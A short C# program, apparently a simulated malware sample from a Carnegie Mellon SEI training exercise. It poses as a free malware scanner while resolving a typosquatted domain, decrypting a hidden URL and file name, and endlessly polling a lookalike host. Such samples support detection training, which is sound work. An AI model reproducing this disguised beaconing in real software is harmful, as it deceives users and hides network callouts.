/*
Copyright 2024 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System.Net;
using System.Runtime.CompilerServices;

string token = "zR2x1TGL87Fv";
string hostname = "updates.micr0sh0ftware.com";
string hostname2 = "token.sh0ftware.com";
string path1 = "/92dae78a6234403fa012928C70b5FC7F/fsz1";
string path2 = "jUI50KCCM8o+aJBAEaVSx2aFwQBfB92AFgnEcDiCZs4l67WUIaK58rIwgfipiktG";
string fileName = "2iQu3MLzEuV5Ufso06qfqw==";

Console.WriteLine("Free scan is checking your machine for malware . . . ");
System.Threading.Thread.Sleep(2000);

try
{
    IPHostEntry host = Dns.GetHostEntry(hostname);
    Console.WriteLine("DNS resolution succeeded.");

    foreach (IPAddress address in host.AddressList)
    {
        Console.WriteLine($"{address}");
    }

    HttpClient client = new HttpClient();
    StringContent content = new StringContent(token);

    Console.WriteLine("Connected to updates server.");
    Console.WriteLine("Retrieving data . . .");

    string decryptedUrl = freescan.Security.DecryptAESString(path2);
    string decryptedFileName = freescan.Security.DecryptAESString(fileName);

    while (true)
    {
        try
        {
            var response = client.GetAsync("http://" + hostname2 + decryptedUrl + "/" + decryptedFileName).Result;
            System.Threading.Thread.Sleep(10000);
        }
            catch(Exception){}
    }
}
catch(Exception)
{
    Console.WriteLine("Failure to contact updates server.");
    Console.WriteLine("DNS resolution failed for hostname: " + hostname);
}





